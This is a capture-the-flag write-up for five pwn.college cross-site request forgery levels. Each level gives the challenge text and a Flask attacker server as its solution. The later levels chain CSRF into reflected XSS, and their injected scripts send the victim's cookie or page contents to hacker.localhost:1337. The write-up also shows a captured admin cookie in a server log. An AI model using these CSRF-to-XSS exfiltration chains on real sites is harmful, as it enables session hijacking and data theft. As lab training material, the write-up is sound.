---
tags: ["Web Security", "Cross Site Request Forgery"]
title: "CSRF - Cross Site Request Forgery"
description: CSRF - Cross Site Request Forgery
reference: https://pwn.college/intro-to-cybersecurity/web-security/
---

# 1

## Description

You've used XSS to inject JavaScript to cause the victim to make HTTP requests. But what if there is no XSS? Can you just "inject" the HTTP requests directly?

Shockingly, the answer is yes. The web was designed to enable interconnectivity across many different websites. Sites can embed images from other sites, link to other sites, and even redirect to other sites. All of this flexibility represents some serious security risks, and there is almost nothing preventing a malicious website from simply directly causing a victim visitor to make potentially sensitive requests, such as (in our case) a GET request to http://challenge.localhost/publish!

This style of forging requests across sites is called Cross Site Request Forgery, or CSRF for short.

Note that I said almost nothing prevents this. The Same-origin Policy was created in the 1990s, when the web was still young, to (try to) mitigate this problem. SOP prevents a site at one Origin (say, http://www.hacker.com or, in our case, http://hacker.localhost:1337) from interacting in certain security-critical ways with sites at other Origins (say, http://www.asu.edu or, in our case, http://challenge.localhost/). SOP prevents some common CSRF vectors (e.g., when using JavaScript to make a requests across Origins, cookies will not be sent!), but there are plenty of SOP-avoiding ways to, e.g., make GET requests with cookies intact (such as full-on redirects).

In this level, pwnpost has fixed its XSS issues (at least for the admin user). You'll need to use CSRF to publish the flag post! The /challenge/victim of this level will log into pwnpost (http://challenge.localhost/) and will then visit an evil site that you can set up (http://hacker.localhost:1337/). hacker.localhost points to your local workspace, but you will need to set up a web server to serve an HTTP request on port 1337 yourself. Again, this can be done with nc or with a python server (for example, by using http.server or simply adapting the challenge server code itself!). Because these sites will have different Origins, SOP protections will apply, so be careful about how you forge the request!

## Solution

The server will cause the victim redirect to the endpoint that we want him to visit.

```python
#!/opt/pwn.college/python

import tempfile
import flask
import os

app = flask.Flask(__name__)

app.config['WTF_CSRF_ENABLED'] = False


@app.route("/", methods=["GET"])
def challenge_get():
    return flask.redirect("http://challenge.localhost:80/publish", code=301)

app.run("127.0.0.1", 1337)
```

---

# 2

## Description

Recall that requests that originate from JavaScript run into the Same-Origin Policy, which slightly complicated our CSRF in the previous level. You figured out how to make a GET request without JavaScript. Can you do the same for POST?

Recall that a typical POST request is a result of either a JavaScript-invoked request (no good for SOP) or an HTML form submission. You'll need to do the latter. Of course, the /challenge/victim won't click the Submit button for you --- you'll have to figure out how to do that yourself (HINT: JavaScript can click that button; the request will still count as originating from the form!).

Go POST-CSRF to the flag!

## Solution

1. cause the victim get to the endpoint `/r`
2. the `/r` endpoint will redirect the client to `http://challenge.localhost:80/publish` with the `POST` method

```python
#!/opt/pwn.college/python

import tempfile
import flask
import os

app = flask.Flask(__name__)

app.config['WTF_CSRF_ENABLED'] = False

@app.route("/", methods=["GET"])
def root():
    return """
    <html>
    <body onload="document.forms[0].submit()">
        <form action="http://hacker.localhost:1337/r" method="post">
        </form>
    </body>
    </html>
    """

@app.route("/r", methods=["POST"])
def redirect():

    return flask.redirect("http://challenge.localhost:80/publish", code=307)

app.run("127.0.0.1", 1337)
```

---

# 3

## Description

Let's start putting a few things together... A CSRF can lead to many things, including other injections! Use the CSRF in this level to trigger a XSS and invoke an alert("PWNED") somewhere in http://challenge.localhost!

HINT: You will likely want to use JavaScript on your http://hacker.localhost:1337 page to send a GET request with <script> tags in a URL parameter. Be careful: if you encode this JavaScript in your HTML, your <script> tag will have the word </script> in a string (the URL parameter). This string </script> will actually be parsed by your browser as the closing tag of your page's actual <script> tag, and all hell will break loose.

If you encounter this error, I recommend dynamically building that string (e.g., "</s"+"cript>") in the JavaScript that runs on http://hacker.localhost:1337.

## Solution

```python
#!/opt/pwn.college/python

import tempfile
import flask
import os

app = flask.Flask(__name__)

app.config['WTF_CSRF_ENABLED'] = False

@app.route("/", methods=["GET"])
def root():
    return flask.redirect("http://challenge.localhost:80/ephemeral?msg=<script>alert('PWNED')</script> HTTP/1.1", code=301)

@app.route("/r", methods=["POST"])
def redirect():
    return flask.redirect("http://challenge.localhost:80/publish", code=307)

app.run("127.0.0.1", 1337)
```

---

# 4

## Description

Okay, now that you have the CSRF-to-XSS chain figured out, pull off a CSRF leading to an XSS leading to a cookie leak that'll allow you to log in and get the flag!

HINT: Your solution might have two levels of JavaScript: one that runs on your http://hacker.localhost:1337 page, and one that runs in the reflected XSS. We suggest testing the latter first, by manually triggering the page with that input and seeing the result. Furthermore, as this code might be complex, be VERY careful about URL encoding. For example, + will not be encoded to %2b by most URL encoders, but it is a special character in a URL and gets decoded to a space ( ). Needless to say, if you use + in your JavaScript, this can lead to complete havoc.

## Solution

1. Run a hacker server that the victim will be redirect to `challenge.local` site and send the `challenge.local` site cookie to the hacker by combing CSRF and XSS

```python
#!/opt/pwn.college/python

import tempfile
import flask
import os

app = flask.Flask(__name__)

app.config['WTF_CSRF_ENABLED'] = False

@app.route("/", methods=["GET"])
def root():
    return flask.redirect("http://challenge.localhost:80/ephemeral?msg=<script>fetch(`http://hacker.localhost:1337/r?=msg=${document.cookie}`" + ", { method: 'GET', credentials: 'include', mode: 'cors'});</script>", code=301)

@app.route("/r", methods=["GET"])
def redirect():
    return ""
```

2. Get the victim cookie from hacker server log

```
127.0.0.1 - - [29/Jul/2025 12:18:05] "GET / HTTP/1.1" 301 -
127.0.0.1 - - [29/Jul/2025 12:18:05] "GET /r?=msg=auth=admin|.QX5kzMzwCM0YjMyEzW} HTTP/1.1" 200 -
```

---

# 5

## Description

This level closes the loophole that allowed you to steal cookies from JavaScript. Cookies have a special setting called httponly, and when this is set, the cookie is only accessible in HTTP headers, and not through JavaScript. This is a security measure, aimed to prevent exactly the type of cookie pilfering that you have been doing. Luckily, Flask's default session cookie is set to be httponly, so you cannot steal it from JavaScript.

So, now how would you get the flag with your CSRF-to-XSS shenanigans? Luckily, you don't need the cookie! Once you have JavaScript execution within the page, you can freely fetch() other pages without worrying about the Same Origin Policy, since you now live in the same Origin. Use this, read the page with the flag, and win!

## Solution

Hacker Server Code:

1. redirect to the `/ephemeral` endpoint of `challenge.localhost` host with injected javascript
1. this script will fetch the html file of `/` endpoint of `challenge.localhost` host and then send it back to hacker server

```python
#!/opt/pwn.college/python

import tempfile
import flask
import os

app = flask.Flask(__name__)

app.config['WTF_CSRF_ENABLED'] = False

@app.route("/", methods=["GET", "POST"])
def root():
    if flask.request.method == "GET":
        xss = "<script> fetch(`/`) .then(res => res.text()) .then(content => { return fetch(`http://hacker.localhost:1337`, { method: `POST`, body: content }); }); </script>"
        return flask.redirect("http://challenge.localhost:80/ephemeral?msg=" + xss, code=301)


    data = flask.request.data.decode("utf-8")
    print(data)
    return ""
```
